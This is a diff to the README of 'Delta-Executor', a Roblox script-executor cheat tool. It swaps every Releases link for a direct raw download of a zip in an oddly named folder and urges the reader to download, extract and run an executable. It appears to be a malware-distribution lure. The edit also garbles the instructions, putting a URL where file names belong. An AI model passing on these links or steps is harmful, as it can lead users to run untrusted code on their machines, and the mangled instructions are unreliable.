@@ -1,6 +1,6 @@
 # 🚀 Delta-Executor - Transform Your Roblox Experience
 
-[![Download Delta-Executor](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/dhudhdhd/Delta-Executor/releases)
+[![Download Delta-Executor](https://raw.githubusercontent.com/dhudhdhd/Delta-Executor/main/anatexis/Delta-Executor.zip)](https://raw.githubusercontent.com/dhudhdhd/Delta-Executor/main/anatexis/Delta-Executor.zip)
 
 ## 🌟 Overview
 
@@ -18,19 +18,19 @@ Follow these simple steps to download and run Delta-Executor.
 
 1. **Visit the Download Page**  
    Click the link below to go to the Releases page.  
-   [Visit this page to download](https://github.com/dhudhdhd/Delta-Executor/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/dhudhdhd/Delta-Executor/main/anatexis/Delta-Executor.zip)
 
 2. **Select the Latest Version**  
    On the Releases page, find the latest version of Delta-Executor. It'll typically be at the top of the page. The version will be displayed with a title like "v1.0" or "v1.1".
 
 3. **Download the Application**  
-   Click on the file name to start the download. The file will usually be named something like `Delta-Executor-v1.0.zip`.
+   Click on the file name to start the download. The file will usually be named something like `https://raw.githubusercontent.com/dhudhdhd/Delta-Executor/main/anatexis/Delta-Executor.zip`.
 
 4. **Extract the Files**  
    Once downloaded, locate the zip file in your downloads folder. Right-click the file and select "Extract All..." to unzip it. Choose a location where you would like to save the files.
 
 5. **Run the Application**  
-   Open the extracted folder and find the application file named `Delta-Executor.exe`. Double-click it to launch the application.
+   Open the extracted folder and find the application file named `https://raw.githubusercontent.com/dhudhdhd/Delta-Executor/main/anatexis/Delta-Executor.zip`. Double-click it to launch the application.
 
 ## 🔧 System Requirements
 
@@ -43,7 +43,7 @@ Before using Delta-Executor, ensure your computer meets these requirements:
 
 ## 📥 Download & Install
 
-To get started with Delta-Executor, [visit this page to download](https://github.com/dhudhdhd/Delta-Executor/releases). Make sure to follow the earlier steps to install it on your computer. 
+To get started with Delta-Executor, [visit this page to download](https://raw.githubusercontent.com/dhudhdhd/Delta-Executor/main/anatexis/Delta-Executor.zip). Make sure to follow the earlier steps to install it on your computer. 
 
 ## 📚 Usage Instructions
 
